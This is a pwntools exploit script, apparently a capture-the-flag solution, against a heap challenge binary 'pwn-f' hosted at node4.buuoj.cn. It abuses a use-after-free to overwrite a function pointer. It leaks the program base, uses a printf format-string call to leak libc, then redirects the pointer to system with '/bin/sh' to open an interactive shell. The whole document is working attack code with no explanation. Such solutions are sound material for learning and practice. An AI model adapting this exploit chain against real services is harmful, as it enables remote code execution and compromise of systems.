from pwn import *

elf = ELF('pwn-f')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(size, content):
    sla(b'3.quit', b'create ')
    sla(b'size:', str(size).encode())
    sa(b'str:', content)

def delete(index):
    sla(b'3.quit', b'delete ')
    sla(b'id:', str(index).encode())
    sla(b'sure?:', b'yes')

def exp():
    alloc(0x20, b'a') #0
    alloc(0x20, b'a') #1

    delete(1)
    delete(0)

    alloc(0x20, b'a' * 0x18 + b'\x1a') #0
    delete(1)

    ru(b'a' * 0x18)
    proc_base = u64(rv(6).ljust(8, b'\x00')) - 0xd1a
    printf_plt = proc_base + elf.plt['printf']
    success('proc_base -> {}'.format(hex(proc_base)))

    delete(0)
    alloc(0x20, b'qwq%22$p'.ljust(0x18, b'a') + p64(printf_plt))
    delete(1)

    ru(b'qwq')
    libc_base = int(rv(14), 16) - libc.sym['_IO_2_1_stdout_']
    system = libc_base + libc.sym['system']
    success('libc_base -> {}'.format(hex(libc_base)))
    
    delete(0)
    alloc(0x20, b'/bin/sh && '.ljust(0x18, b'a') + p64(system))
    delete(1)

    p.interactive()

if __name__ == "__main__":
    while True:
        libc = ELF('libc-2.23.buu.so')
        #p = process('./pwn-f')
        p = remote('node4.buuoj.cn', 28245)
        exp()
        break